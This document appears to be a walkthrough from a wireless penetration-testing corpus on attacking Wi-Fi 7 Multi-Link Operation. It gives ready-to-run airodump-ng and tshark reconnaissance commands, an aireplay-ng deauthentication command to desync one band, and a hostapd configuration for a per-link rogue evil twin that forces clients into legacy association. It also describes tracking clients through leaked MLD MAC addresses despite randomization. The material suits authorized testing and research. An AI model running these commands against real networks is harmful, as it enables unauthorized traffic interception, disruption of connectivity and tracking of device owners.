# Wi-Fi 7 (MLO) — walkthrough

MLO attacks are frontier — the corpus tracks published primitives as
they appear. What follows is the 2024–2026 baseline: reconnaissance,
link-desync trigger, and the practical evil-twin-per-link pivot that
works today even without a novel MLO CVE in hand.

## PMF-required baseline

Per WFA Wi-Fi 7 certification, all Wi-Fi 7 operation mandates PMF.
Deauth against an MLO client is a no-op — the MLD authenticates
management frames on every link. Reach for the karma-family cold-start,
Kr00k tail decrypt, or SSID Confusion / FT reassoc capture instead.

The Path B deauth-based probe below is retained only as a diagnostic
against non-conforming stacks; against a spec-compliant Wi-Fi 7 client
it will fail silently.

## Path A — Enumerate the MLD

```
# passive capture across 2.4 + 5 (+ 6 if radio permits)
# --band abg = 2.4 + 5 GHz only. For 6 GHz include `e` (--band abge)
# AND use a 6 GHz-capable radio (see wifi6-6e/walkthrough.md).
airodump-ng --band abg -w /tmp/mlo wlan1mon

# find EHT beacons — IE 255 ext ID 108 (EHT Capabilities)
tshark -r /tmp/mlo-01.cap \
       -Y "wlan.ext_tag.number == 108" \
       -T fields -e wlan.bssid -e wlan.ssid

# find the Basic Multi-Link element — the MLD MAC is inside
tshark -r /tmp/mlo-01.cap -V | grep -A6 "Multi-Link Element"
```

Note both:

- **MLD MAC** — the client's identity across all links.
- **Per-link BSSIDs** — the AP's radio-band identities.

## Path B — Link-desync via targeted band suppression

The idea: knock one link out of sync so the AP and client disagree on
per-link state (packet-number counters, block-ack windows).

```
# 1. Confirm the client is associated on multiple links.
#    Look for the Basic Multi-Link element in its (Re)Association Request.
#    Wireshark 4.2+: wlan.eht.multi_link.control.type == 0
#    Wireshark 4.0/4.1 (older dissector): wlan.ml.control.type == 0
#    The field name changed with the EHT dissector rework; grep both.
#
# 2. Deauth ONLY on the 2.4 GHz link (the weaker one, easier to reach).
aireplay-ng -0 3 -a AP_BSSID_24 -c CLIENT_LINK_MAC_24 wlan1mon
#
# 3. The 5 GHz + 6 GHz links remain up. The client's per-link security
#    context for 2.4 GHz should reset on reassoc; the AP's may not.
#
# 4. Watch the 5 GHz side for anomalous replays or block-ack
#    NAK storms. The bug — if present in this vendor's stack — surfaces
#    as decrypt failures or an unexpected key reinstall.
```

This is a *probe*, not a guaranteed compromise. As of the corpus's
2026 target, no publicly-cited MLO CVE has the reliability of KRACK.
Track `attacks.json:wifi7-mlo-link-desync` for updates.

## Path C — Per-link evil twin (works today)

The pragmatic play. Wi-Fi 7 clients still fall back to non-MLO
association if only one band is available. Bring up a WPA2 or
WPA2/WPA3-transition rogue on one band, ensure it's the strongest
candidate for that band, and the client associates as a *legacy*
(single-link) STA. All the WPA2/3 attack primitives apply.

```
# hostapd config for a single-link rogue on 5 GHz UNII-1
interface=wlan1
ssid=TargetSSID
hw_mode=a
channel=36
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=<known or guessed PSK>
```

## Failure modes

- **Client refuses non-MLO fallback.** Some 2025+ enterprise
  supplicants require MLO on networks tagged MLO-preferred. You'll
  need to clone all the bands the profile expects.
- **Per-link MAC randomization.** The MLD MAC still leaks in some
  Association Request elements; correlate on that even when link
  MACs are randomized.
- **PMF-required on every link.** All the deauth-based per-link
  probes become no-ops. Fall back to Path C.

## Cite

- IEEE Std 802.11be-2024, §35 (MLO).
- attacks.json: `wifi7-mlo-link-desync` (confidence: secondary —
  frontier research area).
